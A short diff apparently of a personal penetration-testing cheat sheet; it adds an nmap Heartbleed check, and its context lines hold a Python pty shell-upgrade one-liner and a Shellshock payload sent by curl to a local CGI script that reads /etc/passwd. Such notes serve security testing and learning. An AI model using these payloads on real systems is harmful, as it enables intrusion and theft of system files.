@@ -15,5 +15,8 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \
 http://localhost:8080/cgi-bin/vulnerable
 
+# heartbleed check
+nmap -sV -script=ssl-heartbleed [host]
+
 # repository kali
 https://docs.kali.org/general-use/kali-linux-sources-list-repositories
